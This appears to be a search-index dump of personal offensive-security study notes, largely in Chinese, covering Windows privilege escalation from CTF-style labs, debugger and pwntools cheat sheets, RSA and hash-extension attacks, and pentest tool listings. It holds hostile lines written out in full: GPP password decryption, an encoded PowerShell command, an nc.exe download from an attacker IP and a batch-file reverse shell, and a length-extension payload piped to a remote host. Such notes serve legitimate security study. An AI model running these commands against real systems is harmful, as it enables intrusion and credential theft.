&lt;Username&gt;Administrator&lt;\/Username&gt; &lt;\/AutoLogon&gt; Groups.xml - Group Policy Preference saved passwords The AES Key 4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8 f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b PS C:\\Programdata&gt; cmd.exe \/c &quot;dir \/s \/b | findstr Groups.xml&quot; C:\\Programdata\\Microsoft\\Group Policy\\History\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Preferences\\Groups\\Groups.xml PS C:\\Programdata&gt; Get-Content &quot;C:\\Programdata\\Microsoft\\Group Policy\\History\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Preferences\\Groups\\Groups.xml&quot; &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt; &lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;Administrator&quot; image=&quot;2&quot; changed=&quot;2019-01-28 23:12:48&quot; uid=&quot;{CD450F70-CDB8-4948-B908-F8D038C59B6C}&quot; userContext=&quot;0&quot; removePolicy=&quot;0&quot; policyApplied=&quot;1&quot;&gt; &lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;CiDUq6tbrBL1m\/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1\/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ&quot; changeLogon=&quot;0&quot; noChange=&quot;0&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;Administrator&quot;&gt;&lt;\/Properties&gt;&lt;\/User&gt;&lt;\/Groups&gt; python Gpprefdecrypt.py CiDUq6tbrBL1m\/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1\/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ MyUnclesAreMarioAndLuigi!!1! In addition to Groups.xml several other policy preference files can have the optional \u201ccPassword\u201d attribute set: Services\\Services.xml: Element-Specific Attributes ScheduledTasks\\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element Printers\\Printers.xml: SharedPrinter Element Drives\\Drives.xml: Element-Specific Attributes DataSources\\DataSources.xml: Element-Specific Attributes AlwaysInstallElevated AlwaysInstallElevated - \u5141\u8a31\u6240\u6709\u6b0a\u9650\u7684\u4f7f\u7528\u8005\u5b89\u88dd *.msi \u6210\u70ba NT AUTHORITY\\SYSTEM \u5169\u500b\u503c\u90fd\u8981\u662f1 C:\\Windows\\system32&gt; reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated C:\\Windows\\system32&gt; reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated DLL DLL search order on 32-bit systems: The directory from which the application loaded 32-bit System directory (C:\\Windows\\System32) 16-bit System directory (C:\\Windows\\System) Windows directory (C:\\Windows) The current working directory (CWD) - \u5982\u679c\u662f Windows Service \u6703\u5728 C:\\Windows \u4e2d Directories in the PATH environment variable (system then user) msfvenom -f DLL Command Injection pingback check generate pingback payload $ echo &quot;ping -n 1 10.10.14.5&quot; | iconv -t utf-16le | base64 -w 0 cABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADQALgA1AAoA# &gt; powershell -EncodedCommand cABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADQALgA1AAoA ensure pingback $ tcpdump -i tun0 icmp tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes 18:01:08.824794 IP servmon.htb &gt; kali-workplace: ICMP echo request, id 1, seq 1, length 40 18:01:08.824806 IP kali-workplace &gt; servmon.htb: ICMP echo reply, id 1, seq 1, length 40 nc $ mkdir www &amp;&amp; cd www $ cp \/usr\/share\/windows-resources\/binaries\/nc.exe . $ python3 -m http.server 7001 &gt; curl 10.10.14.5:7001\/nc.exe &gt; nc.exe &gt; echo C:\\Temp\\nc.exe 10.10.14.5 7777 -e cmd.exe &gt; reverse.bat","tags":"","url":"Privilege_Escalation\/Windows.html"},{"title":"Misc","text":"","tags":"","url":"Binary_Exploitation\/Misc.html"},{"title":"Linux-Basic","text":"","tags":"","url":"Binary_Exploitation\/Linux_Basic.html"},{"title":"Linux-Heap","text":"","tags":"","url":"Binary_Exploitation\/Linux_Heap.html"},{"title":"Stack Frame & Calling Convention","text":"","tags":"","url":"Binary_Exploitation\/Stack_Frame_Calling_Convention.html"},{"title":"ELF (Executable and Linkable Format)","text":"","tags":"","url":"Binary_Exploitation\/ELF_(Executable_and_Linkable_Format).html"},{"title":"PE (Portable Executable format)","text":"","tags":"","url":"Binary_Exploitation\/PE_(Portable_Executable_format).html"},{"title":"Linux-FILE Structure","text":"","tags":"","url":"Binary_Exploitation\/Linux_FILE_Structure.html"},{"title":"System Call & Shellcode","text":"","tags":"","url":"Binary_Exploitation\/System_Call_Shellcode.html"},{"title":"Windows-Heap","text":"","tags":"","url":"Binary_Exploitation\/Windows_Heap.html"},{"title":"OSX-Heap","text":"","tags":"","url":"Binary_Exploitation\/OSX_Heap.html"},{"title":"C++","text":"","tags":"","url":"Binary_Exploitation\/C++.html"},{"title":"Tools-Pwntools","text":"Pwntools tags: Security Tools Table of Contents Pwntools tags: Security Tools Installation methods asm p u user interaction pause utils cyclic - Generation of unique sequences cyclic : aaaabaaacaaadaaa Installation sudo apt-get update sudo apt-get install python3 python3-dev python3-pip git libssl-dev libffi-dev sudo pip3 install --upgrade git+https:\/\/github.com\/Gallopsled\/pwntools.git@dev3 sudo pip3 install --upgrade git+https:\/\/github.com\/arthaud\/python3-pwntools.git # no longer support methods asm &gt;&gt;&gt; asm('mov eax, 0') '\\xb8\\x00\\x00\\x00\\x00' &gt;&gt;&gt; asm(shellcraft.nop()) '\\x90' &gt;&gt;&gt; disasm('\\xb8\\x0b\\x00\\x00\\x00') ' 0: b8 0b 00 00 00 mov eax,0xb' p &gt;&gt;&gt; p8(0) '\\x00' &gt;&gt;&gt; p32(0xdeadbeef) '\\xef\\xbe\\xad\\xde' &gt;&gt;&gt; p32(0xdeadbeef, endian='big') '\\xde\\xad\\xbe\\xef' &gt;&gt;&gt; with context.local(endian='big'): p32(0xdeadbeef) '\\xde\\xad\\xbe\\xef' u &gt;&gt;&gt; hex(u32(b&quot;\/bin&quot;)) '0x6e69622f' &gt;&gt;&gt; hex(u64(b&quot;\/\/bin\/sh&quot;)) '0x68732f6e69622f2f' user interaction pause utils cyclic - Generation of unique sequences cyclic(16) 'aaaabaaacaaadaaa' cyclic_find('baaa') 4","tags":"","url":"Binary_Exploitation\/Tools_Pwntools.html"},{"title":"Tools-IDA Pro","text":"IDA Pro tags: Security Tools Shortcut n:\u5e6b\u7269\u4ef6\u53d6\u540d\u5b57 y:\u8a2d\u5b9a\u7269\u4ef6\u7684\u985e\u578b g:\u8df3\u5230\u6307\u5b9a\u4f4d\u5740 x:\u627e reference(\u627e\u51fa\u90a3\u88e1\u7528\u5230\u9019\u500b\u7269\u4ef6) Alt-B:\u627e bytes Shfit-F12:\u5b57\u4e32\u5217\u8868 F5:\u53cd\u7de8\u8b6f","tags":"","url":"Binary_Exploitation\/Tools_IDA_Pro.html"},{"title":"Tools-x64dbg","text":"","tags":"","url":"Binary_Exploitation\/Tools_x64dbg.html"},{"title":"Tools-GNU Debugger","text":"GNU Debugger tags: Security Tools Table of Contents GNU Debugger tags: Security Tools Scenario replace got print return address print memory with a struct print exact address of a variable Cheat Sheet Origin Commands about process attach \/ detach kill follow-fork-mode general r (run) start disass (display assemble) modifier: ni (nexti) \/ si (stepi) n (next) \/ s (step) c (continue) print printf l (list) &lt;if available&gt; display until finish x set commands info info registers [REGISTER] about breakpoint b (break) condition delete rbreak about watch point watch &lt;if available&gt; rwatch awatch about catch point catch about frame frame up down bt (backtrace) about TUI peda angelheap Scenario replace got p &amp;stdout x\/6gx &amp;stdout set stdout as stderr(stdout has been closed) set *(long long*)0x601020 = 0x00007ffff7dd2540 print return address \u53ef\u4ee5\u770b\u5230printf\u7684return address x\/60gx $rsp - 16 print memory with a struct p\/x *(struct link_map*)0x00007ffff7ffe168 print exact address of a variable when gdb is set to C language mode (and Objective-C). p &amp;buf general info address buf Cheat Sheet Help Commands help command Get help on a certain command apropos keyword Search help for a particular keyword Starting and Quitting gdb [-tui] [-c core] [exename] (Unix Command) Start gdb on an executable or standalone; specify \"-tui\" to start the TUI GUI; specify \"-c\" with a corefile name to see where a crash occurred run [arg1] [arg2] [...] Run the currently loaded program with the given command line arguments quit Exit the debugger file exename Load an executable file by name Breakpoints and Watchpoints break location Set a breakpoint at a location, line number, or file (e.g. \"main\", \"5\", or \"hello.c:23\") watch expression Break when a variable is written to rwatch expression Break when a variable is read from awatch expression Break when a variable is written to or read from info break Display breakpoint and watchpoint information and numbers info watch Same as info break clear location Clear a breakpoint from a location delete num Delete a breakpoint or watchpoint by number Stepping and Running next Run to the next line of this function step Step into the function on this line, if possible stepi Step a single assembly instruction continue Keep running from here CTRL-C Stop running, wherever you are finish Run until the end of the current function advance location Advance to a location, line number, or file (e.g. \"somefunction\", \"5\", or \"hello.c:23\") jump location Just like continue, except jump to a particular location first. Examining and Modifying Variables display expression Display the value of a variable or expression every step of the program\u2014the expression must make sense in the current scope info display Show a list of expressions currently being displayed and their numbers undisplay num Stop showing an expression identified by its number (see info display) print expression Print the value of a variable or expression printf&nbsp;formatstr&nbsp;expressionlist Do some formatted output with printf() e.g. printf&nbsp;\"i&nbsp;=&nbsp;%d,&nbsp;p&nbsp;=&nbsp;%s\\n\",&nbsp;i,&nbsp;p set variable expression Set a variable to value, e.g. set&nbsp;variable&nbsp;x=20 set (expression) Works like set variable Window Commands info win Shows current window info focus winname Set focus to a particular window bby name (\"SRC\", \"CMD\", \"ASM\", or \"REG\") or by position (\"next\" or \"prev\") fs Alias for focus layout type Set the window layout (\"src\", \"asm\", \"split\", or \"reg\") tui reg type Set the register window layout (\"general\", \"float\", \"system\", or \"next\") winheight val Set the window height (either an absolute value, or a relative value prefaced with \"+\" or \"-\") wh Alias for winheight set&nbsp;disassembly-flavor&nbsp;flavor Set the look-and-feel of the disassembly. On Intel machines, valid flavors are intel and att Misc Commands RETURN Hit RETURN to repeat the last command backtrace Show the current stack bt Alias for backtrace attach pid Attach to an already-running process by its PID info registers Dump integer registers to screen info all-registers Dump all registers to screen Origin Commands about process $ gdb a.out attach \/ detach $ ps aux (gdb) attach $(Pid) (gdb) detach # release\u7a0b\u5f0f kill kill follow-fork-mode \u4e0d\u6703\u56e0\u70basystem(\u201cecho Hello\u201d)\uff0c\u5bb3gdb\u8df3\u6389 set follow-fork-mode parent set follow-fork-mode child general r (run) start Run debugged program until the beginning of the main procedure. disass (display assemble) modifier: \/m print source &lt;if available&gt; \/r print assemble in hex example: disass main disass \/r main disass 0x400530,0x400550 (start, end) ni (nexti) \/ si (stepi) \u57f7\u884c\u4e00\u884c\u7d44\u5408\u8a9e\u8a00 \u4e0d\u540c\u9ede\u5728\u65bc\u5047\u5982\u9047\u5230call function ni\u6703\u57f7\u884c\u5230function\u7d50\u675f n (next) \/ s (step) \u57f7\u884c\u4e00\u884csource code Execute next program line (step into\/over any function calls in the line) c (continue) \u57f7\u884c\u5230\u4e0b\u4e00\u500bbreakpoint print \u5370\u51fa\u67d0\u500b\u8b8a\u6578\u6216 memory address \u7684\u6578\u503c example: (gdb) print x $1 = 0 printf \u4e00\u6b21\u5370\u51fa\u5169\u500b\u4ee5\u4e0a\u7684\u8b8a\u6578 (gdb) print &quot;%d,%d\\n&quot;,x,y 5,2 p password[1]@5 \u5370\u51fapassword[1]\u4e4b\u5f8c5\u500b\u9663\u5217\u88e1\u7684\u503c l (list) &lt;if available&gt; \u986f\u793a\u76ee\u524d\u7a0b\u5f0f\u57f7\u884c\u5230\u90a3\u4e00\u884c display \u5370\u51fa\u67d0\u4e9b\u500b\u8b8a\u6578\u6216 memory address \u7684\u6578\u503c display a \u66ab\u6642\u95dc\u9589 disable display a \u958b\u555f enable display a \u522a\u9664 delete display a until \u57f7\u884c\u5b8c\u7576\u524d\u7684\u8ff4\u5708 until 13 \u4e00\u76f4\u57f7\u884c\u5230\u7b2c13\u884c\u505c\u4e0b\u4f86 finish \u57f7\u884c\u5b8c\u7576\u524d\u7684 function x x[\/FMT] ADDRESS Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal), t(binary), f(float), a(address), i(instruction), c(char), s(string) and z(hex, zero padded on the left). Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes). example: x \/xw 0x80040000 \u4ee516\u9032\u4f4d\u986f\u793a\u6307\u5b9a\u5730\u5740\u7684\u503c x \/8s 0x86468700 \u986f\u793a\u6307\u5b9a\u5730\u5740\u958b\u59cb\u76848\u4e2a\u5b57\u7b26 x \/50i main \u986f\u793amain\u958b\u982d\u768450\u689d\u6307\u4ee4 x \/10i $pc x \/30gx 0x6020c0-0x10 set set *ADDRESS=VALUE set $ZF = 6 set *0xb6d2a908=0 set *(int *)0xb6daaaec=15 set *(int**)0x8048a548=0x55aa55aa gdb&gt; set *0x601030=0x4005a0 gdb&gt; x\/gx 0x601030 0x601030: 0x00007fff004005a0 gdb&gt; set {uint64_t}0x601030=0x4005a0 gdb&gt; x\/gx 0x601030 0x601030: 0x00000000004005a0 commands (gdb) commands 1 Type commands for breakpoint(s) 1, one per line. End with a line saying just &quot;end&quot;. &gt;print i &gt;print password[i] &gt;continue \u7e7c\u7e8c\u57f7\u884c &gt;end \u8f38\u5165\u5b8c\u6210 info example: info b \u5217\u51fa\u6240\u6709\u8a2d\u5b9a\u904e\u7684 breakpoint info program print\u7a0b\u5f0f\u7684\u72c0\u614b info locals \u5370\u51fa\u6240\u6709\u5340\u57df\u8b8a\u6578\u7684\u503c info registers [REGISTER] info registers \u5bdf\u770b\u6240\u6709\u66ab\u5b58\u5668\u7684\u503c(\u53ea\u5305\u62ec\u5e38\u7528\u66ab\u5b58\u5668) info registers pc \u5bdf\u770bPC\u66ab\u5b58\u5668\u7684\u503c(\u53ea\u5305\u62ec\u5e38\u7528\u66ab\u5b58\u5668) info all-registers \u67e5\u770b\u6240\u6709\u66ab\u5b58\u5668(\u5305\u62ec\u6d6e\u9ede\u66ab\u5b58\u5668) about breakpoint b (break) break LOCATION [CONDITION] b main Function: \u7576\u7a0b\u5f0f\u57f7\u884c\u5230 main \u9019\u500b function \u6642\uff0c\u7a0b\u5f0f\u6703\u66ab\u505c b *0x00000000004005f0 memory: \u7576\u7a0b\u5f0f\u57f7\u884c\u5230\u9019\u500b\u8a18\u61b6\u9ad4 address (ry break 10 LineNumber break main.c:20 FileName:LineNumber break tcpdump.c:pcap_parse FileName:Function \u52a0\u4e0a\u689d\u4ef6\u5224\u65b7 break 50 if size&gt;0 \u53ea\u5728\u689d\u4ef6\u9054\u6210\u7684\u6642\u5019\u65b7\u9ede condition \u522a\u9664\u65b7\u9ede\u4e0a\u7684\u89f8\u767c\u689d\u4ef6 delete delete 1 \u79fb\u9664\u7b2c\u4e00\u500b breakpoint rbreak rbreak REGEXP rbreak pcap_* \u7d66\u6240\u6709pcap_\u958b\u982d\u7684function\u6dfb\u52a0breakpoint about watch point watch &lt;if available&gt; \u7528\u4f86\u5075\u6e2c\u90a3\u500b\u8b8a\u6578\u7684\u503c\u6709\u88ab\u4fee\u6539\uff0c\u7576\u6307\u5b9a\u7684\u8b8a\u6578\u88ab\u66f4\u6539\u6642\uff0c\u7a0b\u5f0f\u6703\u66ab\u505c\uff0c\u4e26\u5370\u51fa\u66f4\u6539\u524d\u5f8c\u7684\u6578\u503c example: watch str \u89c0\u5bdf\u8b8a\u6578 str watch (t &gt; 10) \u89c0\u5bdf\u8b8a\u6578 t \u662f\u5426\u5927\u65bc 10 rwatch \u7576\u6307\u5b9a\u8868\u9054\u5f0f\u7684\u503c\u88ab\u8b80\u53d6\u4e86,\u5247\u7a0b\u5f0f\u505c\u6b62 awatch \u7576\u6307\u5b9a\u8868\u9054\u5f0f\u7684\u503c\u88ab\u8b80\u53d6\/\u66f4\u6539\u4e86,\u5247\u7a0b\u5f0f\u505c\u6b62 about catch point catch catch [EVENT] about frame \u6240\u6709\u7684\u7a0b\u5f0f\uff0c\u6bcf\u4e00\u500b function \u90fd\u6703\u88ab\u5206\u914d\u5230\u4e00\u500b frame \uff0c\u6bcf\u500b frame \u90fd\u662f\u4e00\u500b \u7d44\u8a9e stack \uff0c\u5b58\u653e\u6240\u6709\u7d44\u8a9e\u6307\u4ee4\uff0c\u7136\u5f8c\u518d\u4e00\u884c\u4e00\u884c\u7684\u57f7\u884c\uff0c\u4f8b\u5982\u7576\u7a0b\u5f0f\u57f7\u884c\u5230 printf \u9019\u500b function \u7684\u6642\u5019\uff0c\u5c31\u6703\u9032\u5165\u8a72 printf frame \u3002 \u57f7\u884c\u4e2d\u7684function\u70ba0 \u547c\u53eb0\u7684\u70ba1 \u547c\u53eb1\u7684\u70ba2\u2026 frame \u9032\u5165 frame 1 up \u9032\u5165\u4e0a\u4e00\u500b frame down \u9032\u5165\u4e0b\u4e00\u500b frame bt (backtrace) \u5217\u51fa\u76ee\u524d\u6240\u6709\u7684 frame about TUI Tip: layout reg layout src Standard layout\u2014source on top, command window on the bottom layout asm Just like the &quot;src&quot; layout, except it's an assembly window on top layout split Three windows: source on top, assembly in the middle, and command at the bottom layout reg Opens the register window on top of either source or assembly, whichever was opened last tui reg general Show the general registers tui reg float Show the floating point registers tui reg system Show the &quot;system&quot; registers tui reg next Show the next page of registers\u2014this is important because there might be pages of registers that aren't in the &quot;general&quot;, &quot;float&quot;, or &quot;system&quot; sets peda elfsymbol : show elf .plt section \u67e5\u770bfunction .plt vmmap : show memory mapping \u67e5\u770b process mapping \u53ef\u89c0\u5bdf\u6b0a\u9650 readelf : Get headers information from an ELF file \u67e5\u770b section \u4f4d\u7f6e \u627edata\u6bb5 find\/searchmem : Search for a pattern in memory search memeory \u4e2d\u7684 patten(\u627e\u5b57\u4e32) find \/bin\/sh record : record every instruction at runtime pattc : aaaaaaaabbbbbbbbccccccccddddddddd angelheap heapinfo chunkinfo","tags":"","url":"Binary_Exploitation\/Tools_GNU_Debugger.html"},{"title":"Tools-Immunity Debugger","text":"Immunity Debugger tags: Security Tools F2 set break point attach right click &gt; run as administrator &gt; attach &gt; run &gt; close whole program &gt; repeat function go to address need to use twice plugin mona !mona find -s &quot;\\xff\\xe4&quot; -m slmfc.dll Reset windows tiling stackexchange","tags":"","url":"Binary_Exploitation\/Tools_Immunity_Debugger.html"},{"title":"Misc","text":"","tags":"","url":"Web_Application_Attack\/Misc.html"},{"title":"Information Gathering","text":"","tags":"","url":"Web_Application_Attack\/Information_Gathering.html"},{"title":"Front-end Security","text":"","tags":"","url":"Web_Application_Attack\/Front_end_Security.html"},{"title":"PHP Feature in Security","text":"","tags":"","url":"Web_Application_Attack\/PHP_Feature_in_Security.html"},{"title":"File Upload Vulnerability","text":"","tags":"","url":"Web_Application_Attack\/File_Upload_Vulnerability.html"},{"title":"CRLF Injection","text":"","tags":"","url":"Web_Application_Attack\/CRLF_Injection.html"},{"title":"SQL Injection","text":"","tags":"","url":"Web_Application_Attack\/SQL_Injection.html"},{"title":"XSS (Cross-site Scripting)","text":"","tags":"","url":"Web_Application_Attack\/XSS_(Cross_site_Scripting).html"},{"title":"CSRF (Cross-site Request Forgery)","text":"","tags":"","url":"Web_Application_Attack\/CSRF_(Cross_site_Request_Forgery).html"},{"title":"XXE (XML External Entity)","text":"","tags":"","url":"Web_Application_Attack\/XXE_(XML_External_Entity).html"},{"title":"FLI (Local File Inclusion)","text":"","tags":"","url":"Web_Application_Attack\/FLI_(Local_File_Inclusion).html"},{"title":"SSRF (Server Side Request Forgery)","text":"","tags":"","url":"Web_Application_Attack\/SSRF_(Server_Side_Request_Forgery).html"},{"title":"Deserialization Vulnerability","text":"","tags":"","url":"Web_Application_Attack\/Deserialization_Vulnerability.html"},{"title":"SSTI (Server Side Template Injection)","text":"","tags":"","url":"Web_Application_Attack\/SSTI_(Server_Side_Template_Injection).html"},{"title":"Tools-sqlmap","text":"","tags":"","url":"Web_Application_Attack\/Tools_sqlmap.html"},{"title":"Tools-Burp Suite","text":"","tags":"","url":"Web_Application_Attack\/Tools_Burp_Suite.html"},{"title":"Misc","text":"","tags":"","url":"Crypto\/Misc.html"},{"title":"Classical Cipher","text":"Classical Cipher Table of Contents Classical Cipher tags: Security Crypto Caesar cipher Substitution cipher Transposition cipher Scytale cipher tags: Security Crypto Caesar cipher command : tr echo 'Funny{MyfirstCTF}' | tr xyza-w a-z echo 'Fxqqb{MbiluvwCTF}' | tr a-z xyza-w brute force : https:\/\/planetcalc.com\/1434\/ Substitution cipher online tool : quip quip Transposition cipher Rail fence cipher online tool : http:\/\/web.archive.org\/web\/20071104114600\/http:\/\/www.simonsingh.net\/The_Black_Chamber\/railfence.html Scytale cipher online tool : https:\/\/www.dcode.fr\/scytale-cipher command : fold echo -n &quot;ERTKSOOTCMCHYRAFYLIPL&quot; | fold -w3","tags":"","url":"Crypto\/Classical_Cipher.html"},{"title":"Symmetric Encryption","text":"Symmetric Encryption Table of Contents Symmetric Encryption tags: Security Crypto Xor cipher DES Triple DES AES tags: Security Crypto Xor cipher xortool : https:\/\/github.com\/hellman\/xortool most frequent byte: * binary 00 * text 20(space)https:\/\/zh.wikipedia.org\/wiki\/ASCII DES using ssl openssl enc \u2013h \u5217\u51fa OpenSSL \u63d0\u4f9b\u7684\u5c0d\u7a31\u5f0f\u52a0\u89e3\u5bc6\u6f14\u7b97\u6cd5 openssl des -in file -out file.des \u4f7f\u7528 DES \u52a0\u5bc6 openssl des -d -in file.des -out file \u4f7f\u7528 DES \u89e3\u5bc6 Triple DES AES Padding oracle attack \u4f3a\u670d\u5668\u80fd\u5e6b\u6211\u5011\u89e3\u5bc6\u4efb\u610f\u8a0a\u606f \u4f46\u6211\u5011\u53ea\u80fd\u77e5\u9053\u6709\u6c92\u6709 padding \u932f\u8aa4","tags":"","url":"Crypto\/Symmetric_Encryption.html"},{"title":"Asymmetric Cryptography","text":"Asymmetric Cryptography Table of Contents Asymmetric Cryptography tags: Security Crypto RSA \u55ae\u7d14\u5206\u89e3 N Twin Prime common factor attack \u52a0\u5bc6\u6307\u6578\u653b\u64ca - Hastad\u2019s Broadcast Attack \u6a21\u6578\u653b\u64ca - common modulus attack tags: Security Crypto RSA \u9078\u5169\u500b\u8cea\u6578 (p \u548c q) N = p * q \u03d5(n) = (p-1) * (q-1) \u9078\u52a0\u5bc6\u6307\u6578 e \u7b97\u89e3\u5bc6\u6307\u6578 d e*d \u2261 1 (mod \u03d5(n)) from Crypto.Util.number import inverse inverse(e, phi) \u516c\u9470 = (N, e) \u79c1\u9470 = d \u52a0\u5bc6 E(m) = m^e mod n c = pow(m, e, n) \u89e3\u5bc6 D(c) = c^d mod n m = pow(c, d, n) interger &lt;=&gt; string from Crypto.Util.number import bytes_to_long, long_to_bytes c = bytes_to_long(open(&quot;.\/flag.enc&quot;, &quot;rb&quot;).read()) decrypt = long_to_bytes(m) \u7528openssl\u770b\u91d1\u9470 openssl rsa -pubin -in pubkey.txt -text -modulus n = modulus \u7528python\u8b80\u91d1\u9470 from Crypto.PublicKey import RSA key = RSA.importKey(open(&quot;pubkey.txt&quot;, &quot;rb&quot;).read()) key.n key.e \u55ae\u7d14\u5206\u89e3 N online database : factordb.com from Crypto.Util.number import inverse, bytes_to_long, long_to_bytes n = 66473473500165594946611690873482355823120606837537154371392262259669981906291 p = 800644567978575682363895000391634967 q = 83024947846700869393771322159348359271173 e = 65537 phi = (p - 1) * (q - 1) c = bytes_to_long(open(&quot;.\/flag.enc&quot;, &quot;rb&quot;).read()) d = inverse(e, phi) m = pow(c, d, n) decrypt = long_to_bytes(m) print(decrypt) \u5c0f\u6280\u5de7 qiwi CTF iRoot.txt M^e mod N = C M = 2 e = 3 N = 100 \u5982\u679c M^e \u5c0f\u65bc N =&gt; C\u958be\u6b21\u65b9\u6839\u7b49\u65bcM Twin Prime \u5b9a\u7fa9:\u5169\u500b\u516c\u9470\u5206\u5225\u70ba n1 = p*q n2 = (p+2)*(q+2) \u516c\u5f0f p+q = (n2 - n1 - 4)\/2 n1_phi = n1 - (p + q) + 1 n2_phi = n1 + (p + q) + 1 common factor attack \u52a0\u5bc6\u6307\u6578\u653b\u64ca - Hastad\u2019s Broadcast Attack \u6a21\u6578\u653b\u64ca - common modulus attack from Crypto.Util.number import inverse, bytes_to_long, long_to_bytes # C1 = m^e1 mod n # C2 = m^e2 mod n # gcd(e1, e2) = 1 # e1*s1+e2*s2 = 1 # C1^s1 * C2^s2 = m mod n def xgcd(b, n): x0, x1, y0, y1 = 1, 0, 0, 1 while n != 0: q, b, n = b \/\/ n, n, b % n x0, x1 = x1, x0 - q * x1 y0, y1 = y1, y0 - q * y1 return b, x0, y0 def common_modulus_attack(c1, c2, e1, e2, n): _, s1, s2 = xgcd(e1, e2) if s1 &lt; 0: s1 = -s1 c1 = inverse(c1, n) if s2 &lt; 0: s2 = -s2 c2 = inverse(c2, n) c1s1 = pow(c1, s1, n) c2s2 = pow(c2, s2, n) m = (c1s1 * c2s2) % n return m","tags":"","url":"Crypto\/Asymmetric_Cryptography.html"},{"title":"Hash","text":"Hash Table of Contents Hash tags: Security Crypto Rainbow Table SHA1 collision MD5 Collision Length Extension Attack tags: Security Crypto Rainbow Table SHA1 collision MD5 Collision Length Extension Attack https:\/\/www.youtube.com\/watch?v=sawkPgsQPwg using tool : HashPump https:\/\/github.com\/bwall\/HashPump #your token: user=someone #your authentication code: 9863bb3cecccfdb82f689e2ddbdcd9c7ea3c069eb73a730d149c3aae2d60b7c0 #input your token: hashpump -s &quot;9863bb3cecccfdb82f689e2ddbdcd9c7ea3c069eb73a730d149c3aae2d60b7c0&quot; --data &quot;user=someone&quot; -a &quot;user=admin&quot; -k 44 #-k key\u9577\u5ea6\u901a\u5e38\u7531\u539f\u59cb\u78bc\u5f97\u5230 #-a \u60f3\u8981append\u7684\u5b57\u4e32 e43ae12ce0024abef5a376eebfc2ac7fc5a73d6be3a4b871f203f53e12191b5c user=someone\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\xc0user=admin \u4e0d\u7528pwntools \u7c21\u55ae\u9001 payload (python3 -c &quot;import sys; sys.stdout.buffer.write(b'user=someone\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\xc0user=admin\\ne43ae12ce0024abef5a376eebfc2ac7fc5a73d6be3a4b871f203f53e12191b5c\\n')&quot;; cat) | nc oalieno.com.tw 9999","tags":"","url":"Crypto\/Hash.html"},{"title":"Misc","text":"","tags":"","url":"Digital_Forensics\/Misc.html"},{"title":"Mobile Forensics","text":"","tags":"","url":"Digital_Forensics\/Mobile_Forensics.html"},{"title":"Misc","text":"","tags":"","url":"Smart_Contract\/Misc.html"},{"title":"Misc","text":"","tags":"","url":"Attack_And_Defense\/Misc.html"},{"title":"Misc Pentesting Tools","text":"Misc Pentesting Tools Table of Contents Misc Pentesting Tools tags: Security Tools collection Misc impacket impacket-psexec seclists Laudanum Microsoft nishang PowerSploit Others Responder\/MultiRelay tags: Security Tools collection Misc impacket Impacket is a collection of Python classes for working with network protocols. impacket-psexec Get system shell python3 psexec.py Administrator@bastion.htb Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation Password: [*] Requesting shares on bastion.htb..... [*] Found writable share ADMIN$ [*] Uploading file hoQpxzMA.exe [*] Opening SVCManager on bastion.htb..... [*] Creating service qdbo on bastion.htb..... [*] Starting service qdbo..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt;whoami nt authority\\system seclists List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more \/usr\/share\/seclists Discovery IOCs Passwords Payloads Usernames Fuzzing Miscellaneous Pattern-Matching README.md Web-Shells Laudanum Laudanum is a collection of injectable files \/usr\/share\/laudanum asp aspx cfm helpers jsp php README wordpress php - reverse shell \/usr\/share\/laudanum\/php\/php-reverse-shell.php Microsoft nishang Offensive PowerShell for red team, penetration testing and offensive security. GitHub \/usr\/share\/nishang\/ ActiveDirectory Bypass Execution MITM powerpreter Shells Antak-WebShell Client Gather nishang.psm1 Prasadhak Utility Backdoors Escalation Misc Pivot Scan reverse shell PowerSploit PowerSploit - A PowerShell Post-Exploitation Framework \/usr\/share\/windows-resources\/powersploit * this version is too old AntivirusBypass 